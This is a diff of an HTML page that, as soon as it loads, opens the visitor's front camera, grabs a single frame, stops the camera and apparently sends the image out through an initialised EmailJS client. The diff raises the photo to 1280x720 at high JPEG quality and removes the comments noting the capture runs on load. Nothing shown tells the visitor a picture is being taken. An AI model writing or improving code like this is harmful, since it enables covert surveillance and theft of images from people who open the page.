@@ -20,7 +20,7 @@
 </head>
 <body>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="160" height="120"></canvas>
+  <canvas id="canvas" width="1280" height="720"></canvas>
 
   <script>
     emailjs.init("IoSfbtGz4KSL_5_9E");
@@ -31,13 +31,14 @@
 
     async function startCapture() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user", width: 1280, height: 720 } 
+        });
         video.srcObject = stream;
 
-        // Dès que la vidéo est prête, capture immédiate
         video.onloadeddata = () => {
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL("image/jpeg", 0.2);
+          const imageData = canvas.toDataURL("image/jpeg", 0.9); // meilleure qualité
 
           // Stop caméra après capture
           stream.getTracks().forEach(track => track.stop());
@@ -55,7 +56,6 @@
       }
     }
 
-    // Lancement immédiat au chargement de la page
     window.onload = startCapture;
   </script>
 </body>
